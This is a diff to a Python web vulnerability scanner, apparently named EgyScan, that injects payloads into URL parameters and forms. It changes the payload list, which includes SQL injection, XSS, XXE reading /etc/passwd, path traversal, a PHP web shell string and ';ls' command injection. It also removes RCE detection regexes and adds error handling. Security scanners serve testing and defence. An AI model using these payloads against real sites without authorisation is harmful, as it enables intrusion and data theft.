@@ -31,23 +31,20 @@ payloads = [
     "'; SELECT * FROM users; --",
     "<script>alert('AliElTop')</script>",
     "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
-    "webshell.php",
+    "%3Cscript%3Ealert%28%27AliElTop%27%29%3C/script%3E",
     "admin' OR '1'='1",
     "../../../../etc/passwd%00",
-    "<img src=x onerror=alert('AliElTop')>",
     "<?php system($_GET['cmd']); ?>",
     "../../../../etc/passwd",
     "%27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo",
-    "evil_script.js",
     ";ls",
     "ls",
-    "admin.php",
+    "&lt;script&gt;alert('AliElTop')&lt;/script&gt;",
     "+9739343777;phone-context=<script>alert(AliElTop)</script>",
     "+91 97xxxx7x7;ext=1;ext=2",
     "+91 97xxxx7x7;phone-context=' OR 1=1; -",
     "+91 97xxxx7x7;phone-context={{4*4}}{{5+5}}",
-    "robots.txt",
-    "adminer.php",
+    "<style><style /><img src=x onerror=alert(AliElTop)>",
     "phpmyadmin",
     "dbadmin",
     ".env",
@@ -188,7 +185,7 @@ USER_AGENTS = [
 ]
 ALLOWED_HOSTS = ["www.google.com"]
 
-logging.basicConfig(level=logging.WARNING, format="%(levelname)s - %(message)s")
+logging.basicConfig(level=logging.CRITICAL, format="%(levelname)s - %(message)s")
 
 def print_logo():
     logo = """
@@ -839,33 +836,9 @@ def check_rce(url):
         response.raise_for_status()
 
         rce_patterns = [
-            r"ERROR: Command execution",
-            r"System\.Exec",
-            r"exec\(",
-            r"passthru\(",
-            r"shell_exec\(",
-            r"popen\(",
-            r"proc_open\(",
-            r"eval\(",
-            r"assert\(",
-            r"java\.lang\.Runtime\.getRuntime\(\)\.exec\(",
-            r"java\.lang\.ProcessBuilder\.start\(",
-            r"os\.system\(",
-            r"subprocess\.Popen\(",
-            r"subprocess\.call\(",
-            r"subprocess\.check_output\(",
-            r"subprocess\.check_call\(",
-            r"Runtime\.getRuntime\(\)\.exec\(",
-            r"exec\(\$_(GET|POST|REQUEST)",
-            r"assert\(\$_(GET|POST|REQUEST)",
-            r"shell_exec\(\$_(GET|POST|REQUEST)",
-            r"passthru\(\$_(GET|POST|REQUEST)",
-            r"popen\(\$_(GET|POST|REQUEST)",
-            r"proc_open\(\$_(GET|POST|REQUEST)",
-            r"eval\(\$_(GET|POST|REQUEST)",
-            r"system\(\$_(GET|POST|REQUEST)",
-            r"System\.Exec\(\$_(GET|POST|REQUEST)",
-            r"os\.system\(\$_(GET|POST|REQUEST)",
+            r"root:",
+            r"passwd",
+            
         ]
 
         for pattern in rce_patterns:
@@ -1657,6 +1630,10 @@ def collect_urls(target_url, num_threads=10, session=None):
 
                 with urls_lock:
                     urls.update(filtered_urls)
+            elif response.status_code == 404:
+                logging.warning(f"URL returned 404 Not Found: {current_url}")
+            else:
+                logging.warning(f"URL returned status code {response.status_code}: {current_url}")
         except requests.exceptions.RequestException as e:
             logging.error(f"Request Exception for URL: {current_url}, Error: {e}")
         except Exception as e:
@@ -1713,7 +1690,7 @@ def collect_urls(target_url, num_threads=10, session=None):
             worker.join()
 
     return processed_urls
-   
+    
 detected_wafs = []
 
 common_wafs = {
@@ -1771,8 +1748,12 @@ def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=1
         }
         if headers:
             request_headers.update(headers)
-        with requests.request(method=method, url=url, data=data, headers=request_headers) as response:
-            return response
+        try:
+            with requests.request(method=method, url=url, data=data, headers=request_headers) as response:
+                return response
+        except requests.exceptions.RequestException as e:
+            print(f"Error occurred: {e}")
+            return None
 
     def inject_payloads(url, params, payloads, vulnerable_urls, headers=None):
         base_url = urlparse(url).scheme + "://" + urlparse(url).netloc
@@ -1786,24 +1767,14 @@ def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=1
                         f"{key}={quote(value[0])}" for key, value in injected_params.items()
                     )
                     response = make_request(injected_url, headers=headers)
-                    scan_response(response, vulnerable_urls)
+                    if response is not None:
+                        scan_response(response, vulnerable_urls)
 
     def scan_response(response, vulnerable_urls):
         for check_func, vulnerability_type in vulnerability_checks.items():
             if check_func(response.url):
-                print_warning(f"{vulnerability_type}{response.url}")
+                print_warning(f"{vulnerability_type}{response.url}\n")
                 vulnerable_urls.add(response.url)
-
-        for waf_name, waf_signatures in common_wafs.items():
-            for signature in waf_signatures:
-                if signature.lower() in response.headers.get("Server", "").lower():
-                    detected_wafs.append(waf_name)
-
-        print("Response:EgyScan Version 2.0")
-        print(f"Status Code: {response.status_code}")
-        print(f"Server: {response.headers.get('Server', 'N/A')}")
-        print(f"Server Version: {response.headers.get('X-Powered-By', 'N/A')}")
-        print("--------------")
 
     def scan_form(form):
         form_action = form.get("action")
@@ -1821,7 +1792,12 @@ def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=1
     inject_payloads(url, params, payloads, vulnerable_urls, headers=headers)
 
     response = make_request(url, headers=headers)
-    scan_response(response, vulnerable_urls)
+    if response is not None:
+        if response.status_code == 403:
+            print(f"Access Forbidden: The server responded with a 403 error for {url}")
+            return vulnerable_urls
+
+        scan_response(response, vulnerable_urls)
 
     soup = BeautifulSoup(response.text, "html.parser")
     forms = soup.find_all("form")
@@ -1837,8 +1813,6 @@ def scan_and_inject_payloads(url, payloads, headers=None, tokens=None, threads=1
             print(f"- {waf}")
 
     return vulnerable_urls
-
-
 
 vulnerability_checks = {
     check_sqli: "SQL Injection\n",
